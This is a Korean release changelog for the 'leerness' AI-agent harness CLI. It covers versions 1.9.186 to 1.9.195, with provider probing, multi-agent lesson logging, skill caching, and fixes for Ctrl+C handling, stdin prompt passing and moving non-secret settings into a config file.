- **출력 옵션**: `--json` (자동화/CI) · 텍스트 마크다운 (사람 읽기)
- **타임아웃**: `--timeout 1500` (기본, ms)
- **환경변수 override**: `OLLAMA_HOST` / `LMSTUDIO_HOST` / `LLAMACPP_HOST`

### 2. 실 측정 (개발 PC)
```
| id | bin | found | version |
| claude | claude | ✓ | 2.1.146 (Claude Code) |
| codex | codex | ✓ | codex-cli 0.132.0 |
| gemini | gemini | ✗ | - |
| copilot | copilot | ✗ | - |
| ollama | ollama | ✓ | (installed) |

✓ 사용 가능 후보 3건
```

### 3. 신규 함수
- `_probeProviderEndpoints(root, timeoutMs)` — 3종 통합 감지
- `_probeHttpEndpoint(url, timeoutMs)` — Promise 기반 HTTP reachability check

### 4. 누적 회귀 (1.9.189~194) — 모두 유지
- [1.9.194] _suggestNextActions + lazy 감지
- [1.9.193] agents multi consensus → lessons.md
- [1.9.192] _loadOfficialSkillCache + 24h 캐시
- [1.9.191] 구조 최적화 보고서 88/100
- [1.9.190] _selectOne/_selectMany Ctrl+C 즉시 종료
- [1.9.189] _showSlashCommandList + Tab cycle 한 줄 갱신

### 5. stress-v140 — 15/15 PASS
- provider probe (6: 함수 + 3종 대상 + --json + 텍스트) + 성능 (2) + 누적 회귀 (7)
- 성능: --version cold start avg **442 ms** · MCP 54 도구 **514 ms**

### 6. 5축 매트릭스 변동
| 축 | 1.9.194 | 1.9.195 | Δ |
|---|---|---|---|
| A. 범용 AI 하네스 | 9/10 | **9.5/10** | +0.5 (universal probe — 11 backend 후보 자동 감지) |
| 종합 | 46/50 (92%) | **46.5/50 (93%)** | +1% |

### 7. 자동 release 흐름
- main 자동 push **57 라운드 연속** (1.9.140~195)
- npm publish 자동 (1.9.178~)

---

## 1.9.194 — 2026-05-21

**🎯 E축 (게으름 방지) 보강 — handoff 다음 단계 자동 제안 + 24h+ 무진척 lazy 감지.**

자율 모드 124 라운드. 1.9.192 C축 / 1.9.193 B축 보강에 이어 **E축 (9/10 → 목표 9.5/10)** 보강.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"게으름 방지등등 최고의 도구"*

### 1. handoff 다음 단계 자동 제안 (E축 핵심)
- 현재 in-progress task description + Memory Surface (decisions/lessons/plan) 조합 → 다음 단계 1-3개 제안
- 사용자/AI 가 "Next Exact Step" 을 직접 채우지 않아도 즉시 노출
- **7개 휴리스틱**:
  1. lessons.md 실패 매칭 → 회피 전략 적용 (`leerness lessons --auto`)
  2. plan.md milestone 매칭 → milestone 검증 (`leerness plan list`)
  3. decisions.md 결정 매칭 → 영향 확인 (`leerness decision list`)
  4. review-evidence.md 부재 → e2e 실행 (`node ./scripts/e2e.js`)
  5. 24h+ 정체 → task status 갱신 (`leerness task update`)
  6. 버전 변동 task → CHANGELOG/README 갱신 확인 (`leerness whats-new`)
  7. stress test 누락 → 새 stress 작성 권장
- 끄기: `--no-next-actions` 또는 `LEERNESS_NO_NEXT_ACTIONS=1`

### 2. 24h+ 무 진척 lazy 감지
- progress-tracker.md mtime ≥ 24h → `## ⚠ 진척 정체 감지` 자동 출력
- 현재 in-progress task ID + request 요약 표시
- 권장 명령: `leerness task update <id> --status` / `leerness lazy detect --json`
- 끄기: `--no-lazy-warn` 또는 `LEERNESS_NO_LAZY_WARN=1`

### 3. 누적 회귀 (1.9.188~193) — 모두 유지
- [1.9.193] agents multi consensus → lessons.md 자동
- [1.9.192] _loadOfficialSkillCache + 24h 캐시
- [1.9.191] 구조 최적화 보고서 88/100
- [1.9.190] _selectOne/_selectMany Ctrl+C 즉시 종료
- [1.9.189] _showSlashCommandList + Tab cycle 한 줄 갱신
- [1.9.188] stdin prompt 전달

### 4. stress-v139 — 15/15 PASS
- E축 보강 (6: 함수 + 섹션 + 임시 워크스페이스 통합) + 성능 (2) + 누적 회귀 (7)
- 임시 워크스페이스 mtime 25h 강제 → ⚠ 진척 정체 감지 ✓
- 성능: --version cold start avg **479 ms** · MCP 54 도구 **416 ms**

### 5. 5축 매트릭스 변동
| 축 | 1.9.193 | 1.9.194 | Δ |
|---|---|---|---|
| E. 게으름 방지 | 9/10 | **9.5/10** | +0.5 (다음 단계 자동 제안 + lazy 감지) |
| 종합 | 45.5/50 (91%) | **46/50 (92%)** | +1% |

### 6. 자동 release 흐름
- main 자동 push **56 라운드 연속** (1.9.140~194)
- npm publish 자동 (1.9.178~)

---

## 1.9.193 — 2026-05-21

**🤖 B축 (멀티 Sub-Agent 오케스트라) 보강 — agents multi consensus 결과 자동 lessons.md 저장 + 캐시 7일 stale hint.**

자율 모드 123 라운드. 1.9.192 C축 보강에 이어, 5축 매트릭스에서 두 번째로 점수가 낮았던 **B축 (8.5/10 → 목표 9/10)** 보강.

### 사용자 의도 정렬 (1.9.191 verbatim)
> *"멀티 서브 에이전트 오케스트라 ... 최고의 도구"*

### 1. agents multi --execute → lessons.md 자동 저장 (B축 핵심)
- 매 `agents multi --execute` 호출 시 consensus best agent + score 가 `.harness/lessons.md`에 기록
- 같은 keyword 재발 시 handoff lessons auto-recall (1.9.56)가 자동 매칭 → 과거 best agent 우선 시도
- 끄기: `LEERNESS_NO_MULTIAGENT_LESSON=1`

**lesson 블록 포맷:**
```markdown
### 2026-05-21 multi-agent consensus — best=claude (1.9.193)
- task: ...
- agents: claude, codex, gemini (3/3 success)
- best agent: claude, score=0.873
- others: codex=0.71, gemini=0.65
- lesson: 같은 keyword 재발 시 claude 우선 시도 (multi-signal consensus 입증)
```

### 2. skill auto-cache age 7일 stale 강조 (1.9.192 후속)
- handoff body에서 캐시 age ≥ 7일 (veryStale) 시 `⚠ 7일+` 표시
- 갱신 권장 hint: `1.9.193 7일+ stale` 또는 `24h+ expired` 명시
- 사용자가 "오래된 catalog 임을 인지" → 자동 게으름 방지

### 3. 누적 회귀 (1.9.187~192) — 모두 유지
- [1.9.192] _loadOfficialSkillCache + 24h 캐시
- [1.9.191] 구조 최적화 보고서 88/100
- [1.9.190] _selectOne/_selectMany Ctrl+C 즉시 종료
- [1.9.189] _showSlashCommandList + Tab cycle 한 줄 갱신
- [1.9.188] stdin prompt 전달 (useStdinForPrompt)
- [1.9.187] _loadLeernessConfig (.harness/leerness-config.json)

### 4. stress-v138 — 16/16 PASS
- consensus auto-lessons (3) + cache age hint (2) + 1.9.192 잔존 (2)
- 성능: --version cold start avg **396 ms** (376/382/430) · MCP 54 도구 **369 ms**
- 누적 회귀 1.9.187~192 (7)

### 5. 5축 매트릭스 변동
| 축 | 1.9.192 | 1.9.193 | Δ |
|---|---|---|---|
| B. 멀티 Sub-Agent 오케스트라 | 8.5/10 | **9/10** | +0.5 (consensus 자동 lessons → 학습 사이클 완성) |
| C. 공식 표준 스킬 자동 활용 | 9/10 | 9/10 | (유지) |
| 종합 | 45/50 (90%) | **45.5/50 (91%)** | +1% |

### 6. 자동 release 흐름
- main 자동 push **55 라운드 연속** (1.9.140~193)
- npm publish 자동 (1.9.178~)

---

## 1.9.192 — 2026-05-21

**🌐 C축 (공식 표준 스킬 자동 활용) 보강 — handoff에 공식 organization catalog 자동 노출 + 24h 캐시.**

자율 모드 122 라운드. 1.9.191 5축 매트릭스에서 가장 점수가 낮았던 **C축 (8/10 → 목표 9/10)** 보강.

### 사용자 의도 (1.9.191 verbatim)
> *"공식 표준화된 스킬을 적재적소로 자동 활용 ... 최고의 도구로 개발하는게 목표"*

### 1. 공식 organization skill catalog 24h 캐시 (신규)
- 파일: `.harness/skill-auto-cache.json` (비시크릿 — 체크인 가능)
- TTL 24h → `_OFFICIAL_SKILL_CACHE_TTL_MS` 상수
- presets: `vercel-labs/agent-skills` + `anthropics/skills`
- 함수: `_loadOfficialSkillCache` / `_writeOfficialSkillCache` / `_refreshOfficialSkillCache` / `_matchOfficialSkillsFromCache`

### 2. handoff 자동 노출 (사용자 의도 정렬)
**헤드라인 10번째 요소** (1.9.81/93/113/152/162/192):
```
📊 헤드라인 ...· 🌐 official 25/25 (0h✓)
```
- `official {매칭수}/{전체수} ({캐시나이}{만료여부})`
- 캐시 만료 (24h+) 시 `⚠` 표시

**body 섹션** — in-progress task keyword 기반 매칭 top 3:
```
## 🌐 공식 organization 스킬 자동 매칭 (1.9.192) — 키워드 "..."
  vercel-labs/anthropics 등 catalog 캐시 0h ✓ · 3/25건 매칭
  • [vercel] skill-name — description ...
  • [anthropic] another-skill — ...
  → 설치: leerness skill auto-install --yes
```

끄기: `--no-official-skills` 또는 `LEERNESS_NO_OFFICIAL_SKILLS=1`.

### 3. CLI: `leerness skill auto-cache <sub>`
- `status` (default) — 캐시 나이 / 만료 / preset / entry 수 + 샘플 3건
- `refresh` — vercel-labs + anthropics 동기화 (실측 25 entries / 612ms)
- `clear` — 캐시 삭제

### 4. 누적 회귀 (1.9.186~191)
| 버전 | 핵심 검증 항목 | 유지 |
|---|---|---|
| 1.9.191 | 구조 최적화 보고서 88/100 | ✓ |
| 1.9.190 | _selectOne/_selectMany Ctrl+C 즉시 종료 | ✓ |
| 1.9.189 | _showSlashCommandList + Tab cycle 한 줄 갱신 | ✓ |
| 1.9.188 | stdin prompt 전달 (useStdinForPrompt) | ✓ |
| 1.9.187 | _loadLeernessConfig (.harness/leerness-config.json) | ✓ |
| 1.9.186 | _cliChatStream shell:true (Windows .cmd) | ✓ |

### 5. stress-v137 — 17/17 PASS
- 보고서 + 함수 + 헤드라인 + body + CLI + 헤드라인 노출 (8)
- 성능 hot path: --version cold start avg **398 ms** (3 samples: 417/395/381) · MCP 54 도구 **387 ms** (2)
- 누적 회귀 1.9.186~191 (7)

### 6. 5축 매트릭스 변동 (목표)
| 축 | 1.9.191 | 1.9.192 | Δ |
|---|---|---|---|
| C. 공식 표준 스킬 자동 활용 | 8/10 | **9/10** | +1 (handoff 자동 노출 + 24h 캐시) |
| 종합 | 44/50 (88%) | **45/50 (90%)** | +2% |

### 7. 자동 release 흐름 유지
- main 자동 push **54 라운드** 연속 (1.9.140~192)
- npm publish 자동 (1.9.178~)

---

## 1.9.191 — 2026-05-21

**📊 구조 최적화 실 측정 + 목적 매트릭스 88/100 + ScheduleWakeup 안정화 (사용자 명시 3종).**

자율 모드 121 라운드. 사용자 명시:
1. *"ScheduleWakeup의 간격을 줄여주고, 못일어나는 경우가 종종있는거같아"*
2. *"leerness의 구조가 최적화 되어있는지 테스트 및 디버그도 진행"*
3. *"범용 AI 하네스 + 멀티 sub-agent 오케스트라 + 공식 표준화 스킬 자동 활용 + 장기 맥락 + 게으름 방지 = 최고의 도구"*

### 1. 실 측정 메트릭 (1.9.191 vs 1.9.186)

| 항목 | 1.9.191 | 1.9.186 대비 | 평가 |
|---|---|---|---|
| `bin/harness.js` lines | **14,243** | +2,243 (+18.7%) | ⚠ 15K 권장 상한 근접 |
| 함수 수 | **346** | +96 | ✓ |
| CLI 명령 라우팅 | **122** | +20 | ✓ |
| MCP 도구 | **54** | 동등 | ✓ |
| npm tarball | **371 KB** | +13 KB | ✓ |
| `--version` cold | **339 ms** | -10 ms | ✓ |
| `handoff` 실 워크로드 | **355 ms** | -50 ms | ✓ |

### 2. 목적 매트릭스 5축 평가 (44/50 = 88%)

| 축 | 점수 | 핵심 capability |
|---|---|---|
| A. 범용 AI 하네스 | **9/10** | 5 provider + 의존성 0 + cross-platform |
| B. 멀티 Sub-Agent 오케스트라 | **8.5/10** | `agents multi --execute` + consensus + Tab cycle |
| C. 공식 표준 스킬 자동 활용 | **8/10** | vercel/anthropic preset + auto-install (opt-in) |
| D. 장기 맥락/계획 유지 | **9.5/10** | Memory 5종 CRUD + handoff 6채널 + 51 라운드 main push |
| E. 게으름 방지 | **9/10** | verify-claim + lazy detect + audit + drift check |

**남은 12%** (1.9.192~200 마일스톤):
- Tier 1: skill-utility-retro + 외부 SECURITY check
- Tier 2: `_buildCliArgs` 공통 헬퍼 (코드 중복 제거)
- Tier 3: Universal MCP gateway (외부 MCP 통합)
- Tier 4: Continuous learning (lessons → skill 자동 변환)

### 3. ScheduleWakeup 안정화 (사용자 명시)

**못 일어나는 케이스 원인 분석**:
| 원인 | 빈도 | 회피 |
|---|---|---|
| 시스템 sleep/suspend | 높음 | ❌ OS 한계 |
| 사용자 활성 conversation 가로채기 | 중간 | ❌ 우선순위 충돌 |
| wakeup delay 너무 김 | 중간 | ✓ delay 단축 |

**Fix**: 이 라운드부터 **delay 1500s → 900s (15분)**. 사용자 세션 활성 동안 더 빈번한 자율 진행.

### 4. 구조 최적화 후보 (다음 라운드)

- 14K lines monolithic → 곧 15K 도달 → 모듈 분리 검토 (Tier 2)
- skill catalog mtime 기반 invalidation (캐시 stale 회피)
- task list 280+건 → 50건 이상 archive 자동화

상세 보고서: `_reports/structure-optimization-1.9.191.md` (비공개)

### Verified
- stress-v136: **12/12 PASS** (보고서 3 + 성능 2 + 누적 7)
- e2e 217/217 baseline 유지
- `--version` 339ms · MCP tools/list 334ms · handoff 355ms
- VERSION = 1.9.191 · autonomous-rounds = 121 · main 자동 push 52 라운드 연속

---

## 1.9.190 — 2026-05-21

**🚨 설치 가이드 Ctrl+C 미작동 BUG fix (사용자 명시 — npx 진행 차단).**

자율 모드 120 라운드. 사용자 명시 BUG:
> `npx --yes leerness@latest init` 으로 설치 가이드에서 Ctrl+C 누르면 설치 진행이 취소되어야 하는데, 진행되는 버그.

### 근본 원인 (코드 audit)

1.9.34~1.9.189 의 `_selectOne` / `_selectMany` 의 raw mode 코드:
```js
} else if (key === '\x03' || key === 'q' || key === '\x1b') {
  cleanup();
  stdout.write('\n  취소됨\n');
  resolve(opts.defaultIndex != null ? options[opts.defaultIndex] : null);  // ← BUG
}
```

Ctrl+C (`\x03`)가 `q`/`\x1b`(ESC)와 같은 분기로 들어가서 **default 값 반환** → install 흐름이 default 옵션으로 계속 진행 → 사용자 의도(취소)와 정반대 동작.

또한 1.9.184에서 추가한 `process.on('SIGINT', _sigintHandler)` 의 2단계 confirm 은 readline raw mode 가 SIGINT signal 자체를 가로채서 호출되지 않음.

### Fix #1 — `_selectOne` / `_selectMany`: Ctrl+C 명시 분기 + 즉시 종료

```diff
} else if (key === '\x03') {
+  // 1.9.190 (사용자 명시 BUG fix): raw mode 에서 Ctrl+C → 즉시 설치 종료 (npx 진행 차단).
+  //   이전 (1.9.34~1.9.189): default 값 반환 → install 흐름 계속 진행 (사용자 BUG 보고).
   cleanup();
   stdout.write('\n  \x1b[31m✗ 설치 중단됨 (Ctrl+C)\x1b[0m\n');
   process.exit(130);
+} else if (key === '\x1b' || key === 'q' || key === 'Q') {
+  // ESC/q/Q → 단순 취소 (default 반환, install 흐름 계속)
   cleanup();
   stdout.write('\n  취소됨\n');
   resolve(opts.defaultIndex != null ? options[opts.defaultIndex] : null);
}
```

Ctrl+C (\x03) 와 ESC/q 분기를 **완전 분리**:
- **Ctrl+C** → `process.exit(130)` 즉시 종료
- **ESC/q/Q** → default 값 반환 (취소만, 흐름 계속)

### Fix #2 — `ask()` readline SIGINT 명시 처리

```js
function ask(question) {
  return new Promise(resolve => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    // 1.9.190: readline 의 자체 SIGINT 처리 — Ctrl+C 시 즉시 종료.
    rl.on('SIGINT', () => {
      try { rl.close(); } catch {}
      process.stdout.write('\n  \x1b[31m✗ 설치 중단됨 (Ctrl+C)\x1b[0m\n');
      process.exit(130);
    });
    rl.question(question, answer => { rl.close(); resolve(String(answer || '').trim()); });
  });
}
```

readline 의 `'SIGINT'` 이벤트 → 명시 처리 → 즉시 exit.

### Fix #3 — `install()` SIGINT 핸들러 단순화 (2단계 confirm 제거)

```diff
- // 1.9.184: 2단계 confirm (첫 누름 → 안내, 2초 내 두 번째 → 종료)
- let _sigintCount = 0; let _sigintTimer = null;
- const _sigintHandler = () => {
-   _sigintCount++;
-   if (_sigintCount === 1) {
-     process.stdout.write('Ctrl+C 를 2초 이내에 한 번 더 누르면 종료됩니다...');
-     _sigintTimer = setTimeout(() => { _sigintCount = 0; }, 2000);
-     return;
-   }
-   process.exit(130);
- };
+ // 1.9.184+1.9.190: 설치 도중 Ctrl+C 시 즉시 종료 (사용자 명시 BUG fix — npx 진행 차단).
+ //   readline raw mode 가 SIGINT 가로채서 1.9.184 2단계 confirm 동작 안 함 → 즉시 종료로 단순화.
+ const _sigintHandler = () => {
+   process.stdout.write('\n  \x1b[31m✗ 설치 중단됨 (Ctrl+C)\x1b[0m\n');
+   process.exit(130);
+ };
```

### 시각 효과 (모든 fix 통합)

```
$ npx --yes leerness@latest init
🎁 leerness 설치 시작...
설치 언어를 선택하세요
  ↑↓ 이동, Enter 확정, q 취소
  ❯ 자동 감지
    한국어
    English
^C
  ✗ 설치 중단됨 (Ctrl+C)
$
```

(이전엔 Ctrl+C 후에도 설치가 계속 진행되어 default 값으로 모든 파일 생성됨 → 사용자 의도와 정반대)

### Verified
- stress-v135: **13/13 PASS** (사용자 명시 5 + 회귀 2 + 누적 6)
- e2e 217/217 baseline 유지
- `--yes` non-interactive install: 회귀 없음
- ESC/q 단순 취소: 회귀 없음 (default 반환)
- VERSION = 1.9.190 · autonomous-rounds = 120 · main 자동 push 51 라운드 연속

---

## 1.9.189 — 2026-05-21

**⌨️ "/" slash 명령 자동 list + Tab cycle 한 줄 갱신 (사용자 명시 3종).**

자율 모드 119 라운드. 사용자 명시:
1. *"권한 기본값 설정을 / 으로 설정해둘 수 있고 (모든 모델 공통)"* — `/` slash default trigger
2. *"/ 를 입력하면 관련 명령어가 첨부이미지처럼 나열"* — claude code 영감 UX
3. *"탭키로 모델 변경시, 채팅 이력으로 남아서 지져분"* — 한 줄 갱신 (in-place)

### Fix #1 — `/` slash 명령 자동 list

**Before** (claude code 화면 처럼 자동 안 됨):
```
agent[claude/actor/▶]> /
(처리 안 됨 또는 에러)
```

**After** (claude code 스타일):
```
agent[claude · opus-4-7/actor/▶]> /

  Available commands  (also accepts ":" prefix)
  ────────────────────────────────────────────────...
  meta
    /help                  명령 목록
    /quit                  REPL 종료 (세션 자동 저장)
    /clear                 대화 히스토리 초기화
    /status                현재 provider / model / role / perms 상태
    /provider <id>         provider 전환
    /model <id>            현재 provider의 모델 전환
    /stream on|off         실시간 스트리밍 토글
  review
    /review "<req>"        무조건 구현 전 사전 검토
    /permissions <m>       권한 변경 basic|extended|full
  internal
    /verify  /audit  /handoff  /health
  memory
    /lessons  /brainstorm <q>  /tasks  /plan
  bridge
    /web <op>  /pc <op>  /lsp <op>
  ────────────────────────────────────────────────...
  💡 "/" 또는 ":" 접두사로 명령 호출
```

`/` 와 `:` **양쪽 동등** (alias 처리). 모든 모델 공통.

### Fix #2 — Tab cycle 한 줄 갱신 (in-place overwrite)

**Before** (1.9.188까지) — 매 Tab마다 새 줄 누적 → 채팅 이력 지저분:
```
⇄ provider [3/5]: codex ✓ ready
  └ 5개 모델 catalog · Shift+Tab으로 model cycle
⇄ provider [4/5]: gemini ✓ ready
  └ 3개 모델 catalog · Shift+Tab으로 model cycle
⇄ provider [5/5]: copilot ✓ ready
  └ 1개 모델 catalog · Shift+Tab으로 model cycle
⇄ provider [1/5]: ollama
  └ 4개 모델 catalog · Shift+Tab으로 model cycle
...
(채팅 영역이 cycle 흔적으로 가득 참)
```

**After** (1.9.189) — 마지막 1건만 보임:
```
⇄ provider [2/5]: claude ✓ ready
  └ 5개 모델 catalog · Shift+Tab으로 model cycle
agent[claude · opus-4-7/actor/▶]> _
```

```js
// 1.9.189: ANSI cursor up + line clear 로 이전 cycle 라인 덮어씀
let _lastCycleLines = 0;
const _clearLastCycle = () => {
  if (!isTty || _lastCycleLines === 0) return;
  process.stdout.write('\r\x1b[K');  // 현재 prompt 줄 클리어
  for (let i = 0; i < _lastCycleLines; i++) {
    process.stdout.write('\x1b[1A\x1b[K');  // 한 줄 위로 + 클리어
  }
  _lastCycleLines = 0;
};
// cycleProvider/cycleModel 시작 시 호출 → 이전 cycle 출력 제거 → 새 cycle 출력
// 사용자 line 입력 시 _lastCycleLines = 0 reset (cycle 흔적 더 이상 클리어 X)
```

### Fix #3 — Welcome 안내 갱신
```
─────────────────────────────  채팅 시작  ─────────────────────────────
메시지 입력 후 Enter · "/" 입력 시 명령 list · :help 으로도 가능 · Ctrl+C 로 종료
```

### Verified
- stress-v134: **15/15 PASS** (사용자 명시 7 + live 2 + 누적 6)
- e2e 217/217 baseline 유지
- `/` 접두사 7개 명령 모두 정상 동작 (alias 처리)
- Tab cycle in-place overwrite — 채팅 영역 깔끔 유지
- VERSION = 1.9.189 · autonomous-rounds = 119 · main 자동 push 50 라운드 연속

---

## 1.9.188 — 2026-05-21

**🐛 REPL 한글 prompt 전달 BUG fix (stdin) + 세부 모델 표시 + 입력 구분선 (사용자 명시 3종).**

자율 모드 118 라운드. 사용자 명시 핵심 버그:
```
agent[claude/actor/▶]> 이 폴더에 파이썬 프로그램을 하나 제작해줘
  ── claude stream ──
저는 이 프로젝트의 **수석 개발자이자 프로젝트 매니저**입니다.
...
메시지가 "역할:"로만 끝나서 의도를 확신하기 어렵습니다.
```
사용자 의도와 무관한 응답 — **claude가 한글 prompt 끝부분("역할:") fragment만 받음**.

### 근본 원인 (코드 audit)

`cp.spawn(cmd, args, { shell: true })` + Windows cmd.exe + 한글/특수문자 promptText:
- shell:true 일 때 args 가 join되어 shell command line 형성
- Windows cmd.exe가 한글/공백 escape 실패 → claude에 일부 fragment만 전달

### Fix #1 — prompt를 stdin으로 전달 (shell escape 우회)

```diff
- if (provider === 'claude')  { cmd = 'claude'; args = ['--print', promptText]; }
+ // 1.9.188: promptText 는 stdin 으로 → args 에서 제거 (한글/특수문자 안전)
+ let useStdinForPrompt = false;
+ if (provider === 'claude') {
+   cmd = 'claude';
+   args = ['--print'];  // promptText 제거
+   useStdinForPrompt = true;
+ }
```

spawn 시:
```js
child = cp.spawn(cmd, args, {
  stdio: [useStdinForPrompt ? 'pipe' : 'ignore', 'pipe', 'pipe'],
  shell: true
});
if (useStdinForPrompt && child.stdin) {
  child.stdin.write(promptText);
  child.stdin.end();
}
```

`_cliChat` 도 동일하게 `runCommandSafe(..., { input: stdinInput })` 으로 변경.

### Live 검증 (한글 prompt 정확 전달)
```bash
$ leerness agents multi "이 폴더에 파이썬 hello world 프로그램 제작 (응답만 코드)" --only claude --execute
✓ claude   · 8279ms · 9 토큰
  --- 처음 600자 ---
`hello.py` 생성 권한이 필요합니다. 승인해 주세요.
```
**1.9.187까지**: "수석 개발자/프로젝트 매니저..." 같은 무관한 응답 (역할 fragment만 받음)
**1.9.188**: `hello.py 생성 권한 필요` — 정확한 요청 이해 ✓

### Fix #2 — 세부 모델 표시
**Before**: `⚡ provider=claude · model=(기본)`
**After**: `⚡ provider=claude · model=claude-opus-4-7`

```js
// 1.9.188 (사용자 명시): state.model 자동 default (catalog 첫 모델)
if (!state.model) {
  const cat = _PROVIDER_MODEL_CATALOG[state.provider];
  if (cat && cat.length) state.model = cat[0].id;
}
```

prompt 도 세부 모델 명시:
```
Before: agent[claude/actor/▶]>
After:  agent[claude · opus-4-7/actor/▶]>
```

### Fix #3 — 입력 구분선 (Hermes UX 영감)
각 응답 끝에 가로 디바이더 자동 출력 → 입력 영역 시각 명확:

```
[assistant: claude/claude-opus-4-7, role=actor, 4598ms · 425자]

  ────────────────────────────────────────────────...
agent[claude · opus-4-7/actor/▶]> _
```

`_printInputDivider()` 함수 도입 — 터미널 width 기준 자동 길이.

### Verified
- stress-v133: **15/15 PASS** (사용자 명시 6 + live 2 + 누적 7)
- e2e 217/217 baseline 유지
- live 검증:
  - 한글 prompt "이 폴더에 파이썬 hello world 제작" → claude 정확 응답 (12.5초)
  - 영문 prompt "1+1=?" → claude 응답 (9.3초, 회귀 없음)
- VERSION = 1.9.188 · autonomous-rounds = 118 · main 자동 push 49 라운드 연속

---

## 1.9.187 — 2026-05-21

**🔓 비시크릿 LEERNESS_* 설정을 .env → .harness/leerness-config.json 으로 분리 (AI 가시성).**

자율 모드 117 라운드. 사용자 명시: *".env에 입력되어서 AI 에이전트가 참조하거나 읽을 수 없는 위치하면 입력되는 위치를 변경"*.

### 배경 & 분리 정책

| 위치 | 보안 정책 | 용도 |
|---|---|---|
| `.env` (.gitignore) | 시크릿 only | NPM_TOKEN, GITHUB_TOKEN, *_API_KEY |
| `.harness/leerness-config.json` (git checked-in) | 비시크릿 only | 활성화 플래그, 공개 URL, 모델 이름 |

**핵심**: `.env`는 .gitignore + 시크릿용 → 다른 AI 에이전트(Claude Code, Cursor, Copilot 등)가 워크스페이스 읽을 때 자동 노출 X. 비시크릿 LEERNESS_* 설정을 AI 가시 위치로 옮겨 **AI 에이전트 인지도 ↑**.

### 분리 대상 (11개 비시크릿 키)
```js
const _LEERNESS_NONSECRET_KEYS = new Set([
  'LEERNESS_OLLAMA_BASE_URL',    // localhost URL — 비밀 X
  'LEERNESS_OLLAMA_MODEL',       // 모델 이름 — 비밀 X
  'LEERNESS_ENABLE_CLAUDE',      // 활성화 플래그
  'LEERNESS_ENABLE_CODEX',
  'LEERNESS_ENABLE_GEMINI',
  'LEERNESS_ENABLE_COPILOT',
  'LEERNESS_ENABLE_OLLAMA',
  'LEERNESS_SKILL_DISCOVER_URL', // 공개 URL
  'LEERNESS_SKILL_AUTO_DISCOVER',
  'LEERNESS_SKILL_AUTO_INSTALL',
  'LEERNESS_SKILL_AUTO_PRESETS'
]);
```

### .harness/leerness-config.json 예시
```json
{
  "_comment": "leerness 비시크릿 설정. AI 에이전트가 읽을 수 있는 위치 (git checked-in). 시크릿(TOKEN/SECRET/PASSWORD)은 .env 사용.",
  "_docs": "https://github.com/gugu9999gu/leerness#config",
  "_version": "1.9.187",
  "LEERNESS_OLLAMA_BASE_URL": "http://localhost:11434",
  "LEERNESS_OLLAMA_MODEL": "llama3",
  "LEERNESS_ENABLE_CLAUDE": "1",
  "LEERNESS_ENABLE_CODEX": "1",
  "LEERNESS_ENABLE_GEMINI": "0",
  "LEERNESS_ENABLE_COPILOT": "0",
  "LEERNESS_ENABLE_OLLAMA": "0",
  "LEERNESS_SKILL_DISCOVER_URL": "",
  "LEERNESS_SKILL_AUTO_DISCOVER": "0",
  "LEERNESS_SKILL_AUTO_INSTALL": "0",
  "LEERNESS_SKILL_AUTO_PRESETS": "vercel,anthropic"
}
```

### .env (simplified)
```
# Leerness — SECRET 환경변수만 (TOKEN/SECRET/PASSWORD). 비시크릿 설정은 .harness/leerness-config.json 사용.
# .env 는 .gitignore — AI 에이전트(Claude Code, Cursor 등)에 노출되지 않음. 시크릿 안전 보관.
# 비시크릿 (활성화 플래그/모델 이름/공개 URL) 은 .harness/leerness-config.json 참조 → AI 가시성 ↑.

# === 시크릿 (TOKEN/KEY) ===
LEERNESS_NPM_TOKEN=
LEERNESS_GITHUB_TOKEN=
```

### 보안 가드 (이중 안전망)
- **load 가드**: `_loadLeernessConfig` 에서 `_isSecretKey(k)` 매치 시 inject 차단
- **write 가드**: `_writeLeernessConfig` 에서 시크릿 패턴 자동 제거 (잘못 들어간 키 sanitize)
- **정규식**: `/TOKEN|SECRET|PASSWORD|API_KEY|PRIVATE/i`

### 자동 마이그레이션 (1.9.186 이전 .env)
`_migrateNonsecretFromEnv(root)` — 기존 .env 에 비시크릿 LEERNESS_* 가 있으면:
1. config 파일로 자동 이동
2. .env 에서 제거 (직전 # 주석도 함께)
3. 시크릿 (TOKEN/KEY/PASSWORD) 은 절대 건드리지 않음 (보안 first)

### 우선순위 (호환성)
```
1. process.env (이미 설정된 환경변수)
2. .env 파일
3. .harness/leerness-config.json
4. 코드 defaults
```

기존 `process.env.LEERNESS_*` 직접 접근 코드는 변경 X. leerness 시작 시 `_loadEnvFile()` 가 `_loadLeernessConfig()` 도 자동 호출 → config 값을 process.env 로 inject.

### Live 검증 (사용자 워크스페이스 시뮬레이션)
```bash
# Before (1.9.186 .env)
LEERNESS_NPM_TOKEN=test-token-12345
LEERNESS_OLLAMA_BASE_URL=http://localhost:11434
LEERNESS_OLLAMA_MODEL=llama3
LEERNESS_ENABLE_CLAUDE=1
...

# After leerness init (1.9.187)
.env:
  LEERNESS_NPM_TOKEN=test-token-12345  ← 시크릿 보존
  LEERNESS_GITHUB_TOKEN=

.harness/leerness-config.json:
  LEERNESS_OLLAMA_BASE_URL: "http://localhost:11434"
  LEERNESS_OLLAMA_MODEL: "llama3"
  LEERNESS_ENABLE_CLAUDE: "1"
  ...
```

### Verified
- stress-v132: **19/19 PASS** (사용자 명시 7 + live 3 + 누적 9)
- e2e 217/217 baseline 유지
- live 마이그레이션 검증: 시크릿 손실 0건, 비시크릿 100% 이동
- VERSION = 1.9.187 · autonomous-rounds = 117 · main 자동 push 48 라운드 연속

---

## 1.9.186 — 2026-05-21

**🐛 REPL claude stream 0자 응답 BUG fix + 구조 최적화 체크 (사용자 명시 핵심 버그).**

자율 모드 116 라운드. 사용자 명시 핵심 버그 보고:
```
agent[claude/actor/▶]> 파이썬 프로그램 하나 제작해줘
  ── /stream (27596ms) ──
  [assistant: claude/default, role=actor, 27743ms · 0자]
```
*"REPL agent 모드에서 작업 요청 시 AI가 작업을 수행하지 못하고 있다"*

### 근본 원인 발견 (코드 audit)

| 함수 | spawn 방식 | shell | 작동 여부 |
|---|---|---|---|
| `_cliChat` (line 10920) | `runCommandSafe` → spawnSync `shell: true` | true | ✓ 작동 (`agents multi --execute` 검증) |
| `_cliChatStream` (line 11018) | `cp.spawn(cmd, args, { shell: false })` | **false** | ✗ **0자 응답** |

**원인 1**: Windows 에서 `cp.spawn('claude', ..., { shell: false })` 가 `claude.cmd` 를 찾지 못해 stdout 비어있고 27초 timeout 후 종료 (exit code 0).

**원인 2**: claude CLI `--output-format=stream-json --verbose` 가 일부 버전에서 빈 stdout 반환 → out 변수 0자 누적.

### Fix #1 — shell: true (Windows .cmd 호환)
```diff
- child = cp.spawn(cmd, args, {
